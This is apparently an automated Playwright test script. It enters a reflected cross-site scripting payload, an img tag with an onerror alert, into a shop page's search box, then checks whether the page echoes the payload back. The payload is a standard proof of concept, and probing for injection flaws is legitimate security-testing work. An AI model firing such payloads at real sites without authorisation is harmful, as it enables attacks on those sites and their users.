import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  const screenshots = [];
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    await page.screenshot({ path: path.join(screenshotsDir, 'step_1_initial.png') });
    screenshots.push(path.join(screenshotsDir, 'step_1_initial.png'));

    // Wait for the search input by ID
    await page.waitForSelector('#searchInput', { timeout: 5000 });

    // Attempt XSS payload
    const xssPayload = `"><img src=x onerror=alert('XSS')>`;
    await page.fill('#searchInput', xssPayload);

    // Take screenshot after filling input
    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_filled_xss.png') });
    screenshots.push(path.join(screenshotsDir, 'step_2_filled_xss.png'));

    // Try to click the search button (by class, first visible)
    const searchBtnSelector = '.search-btn';
    await page.waitForSelector(searchBtnSelector, { timeout: 5000 });
    const buttons = await page.$$(searchBtnSelector);
    let clicked = false;
    for (const btn of buttons) {
      if (await btn.isVisible()) {
        await btn.click();
        clicked = true;
        break;
      }
    }

    // Take screenshot after clicking search
    await page.screenshot({ path: path.join(screenshotsDir, 'step_3_after_search.png') });
    screenshots.push(path.join(screenshotsDir, 'step_3_after_search.png'));

    // Wait for possible XSS reflection in the DOM (search results)
    let reflected = false;
    let reflectedSelector = null;
    // Try to find the payload in the page source (e.g., in headings or results)
    const possibleSelectors = [
      'h2', // search results title
      '.results-count',
      '.search-results',
      '.products-grid',
      '.product-title',
      'body'
    ];
    for (const sel of possibleSelectors) {
      try {
        await page.waitForSelector(sel, { timeout: 1000 });
        const html = await page.$eval(sel, el => el.innerHTML || el.textContent || '');
        if (html && html.includes(xssPayload)) {
          reflected = true;
          reflectedSelector = sel;
          break;
        }
      } catch (e) {
        // Ignore missing selectors
      }
    }

    // Extracted data for verification
    const extractedData = {
      xssPayload,
      reflected,
      reflectedSelector
    };

    return {
      success: true,
      action: "Attempted XSS via search input and checked for payload reflection in DOM",
      extractedData,
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete task",
      extractedData: {},
      screenshots,
      error: error.message
    };
  }
}
